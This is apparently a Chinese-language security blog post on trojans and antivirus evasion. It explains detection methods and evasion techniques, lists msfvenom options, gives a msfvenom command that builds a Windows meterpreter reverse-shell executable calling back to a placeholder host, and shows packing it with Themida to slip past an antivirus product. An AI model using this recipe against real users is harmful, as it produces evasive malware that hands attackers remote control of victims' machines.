---
title: 木马与免杀
author: Pandaho
date: 2022-1-23 20:00:00 
categories: [Project] 
tags: [security]
image: /assets/img/security-msfvenom-miansha/cover.png
---




## 法律声明

**中华人民共和国刑法：** 第285、286、287条

**第二百八十五条** 违反国家规定，·侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

**第二百八十六条** 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。

**第二百八十七条** 利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。



## 用知识的土壤来填埋这些坑洞

**后门木马又称特洛伊木马（Trojan Horse）**

是一种后门程序。后门木马具有很高的伪装性，通常表现为一个正常的应用程序或文件，以获得广泛的传播和目标用户的信任。当目标用户执行后门木马程序后，攻击者即可对用户的主机进行破坏或盗取敏感数据，如各种账户、密码、保密文件等。在黑客进行的各种攻击行为中，后门木马基本上都起到了先导作用，为进一步的攻击打下基础。

**杀毒原理**

基于特征码的静态扫描技术：匹配到特征字符串就可以判断出来这个文件是一个病毒。

启发式扫描：通过分析指令出现的顺序，或特定组合情况等常见病毒的标准特征来判断文件是否感染未知病毒。

虚拟化技术：为待查的可执行程序创建一个虚拟的执行环境，提供它可能用到的一切元素，包括硬盘，端口等，让它在其上自由发挥，最后根据其行为来判定是否为病毒。

**免杀技术**

修改特征码：根据校验和查杀技术提出的免杀思想，如果一个文件某个特定区域的校验和符合病毒库中的特征，那么反病毒软件就会报警。如果想阻止反病毒软件报警，只要对病毒的特定区域进行一定的更改，就会使这一区域的校验和改变，从而达到欺骗反病毒软件的目的。

花指令：在程序`shellcode`或特征代码区域增添垃圾指令，这些指令没有实际含义，不会改变程序运行逻辑，但可以阻止反编译，现在杀软在检测特征码时，都会存在偏移范围，当我们使用花指令对特征码区域进行大量填充，这样就可以实现躲避杀软的特性。

加壳：加密壳基本上可以把特征码全部掩盖。这里说的壳指加密壳，一些普通压缩壳，并不能起到改变特征码的效果，例如：`UPX`、`ASPack`等。

编译技术：多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样。还可以利用管道进行多重编码进行免杀。

### msfvenom

一个后门木马生成的渗透工具，支持的命令参数：

```shell
Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取
        --payload-options            List the payload's standard options # 列出指定 Payload 的标准可选配置项
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）
    -f, --format        <format>     Output format (use --help-formats for a list) # 指定 Payload 的输出格式
        --help-formats               List available formats # 列出所有可用的输出格式
    -e, --encoder       <encoder>    The encoder to use # 指定使用的 Encoder
    -a, --arch          <arch>       The architecture to use # 指定目标系统架构
        --platform      <platform>   The platform of the payload # 指定目标系统平台
        --help-platforms             List available platforms # 列出可用的平台
    -s, --space         <length>     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff' # 设置需要在 Payload 中避免出现的字符
    -i, --iterations    <count>      The number of times to encode the payload # 设置 Payload 的编码次数
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件
    -x, --template      <path>       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行
    -o, --out           <path>       Save the payload # 保存 Payload 到文件
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats # 指定一个变量名
（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）
        --smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload
    -h, --help                       Show this message # 帮助
```

这次主要介绍一个免杀工具，现今单纯采用工具生成的木马基本都很难逃过查杀，所以必须采用加壳、花指令，编译等方式进行免杀，以下是免杀工具测试过程：

```shell
msfvenom -platform windows -a x86 -p windows/meterpreter/reverse_tcp  lhost=x.x.x.x port=4444 -f exe -o /root/xx.exe
#先生成一个木马
set payload windows/meterpreter/reverse_tcp
#进入msfconsole设置payload
```

**Themida**

这是一款软件保护器，创建软件保护程序是为了防止攻击者直接检查或修改已编译的应用程序。软件保护器就像一个保护应用程序加密并防止可能的攻击的盾牌。当操作系统要运行受保护的应用程序时，软件保护程序将首先控制 CPU 并检查可能在系统上运行的破解工具（反编译器或反编译器）。如果一切安全，软件保护程序将继续解密受保护的应用程序，并让其控制 CPU 正常执行。

该软件主要是用来防反编译的，也就是说可以加固应用程序，那我们生成的木马自然也可以用来加固，实现免杀。

免杀效果（截至2022年01月23日，火绒版本5.0.65.2）

加固前

![图例](/assets/img/security-msfvenom-miansha/1.png)

加固后

![图例](/assets/img/security-msfvenom-miansha/2.jpg)



## 参考来源

[Themida官网](https://www.oreans.com/Themida.php)

[免杀技术详解](https://www.freebuf.com/articles/web/271271.html)

[msfvenom详解](https://xz.aliyun.com/t/2381)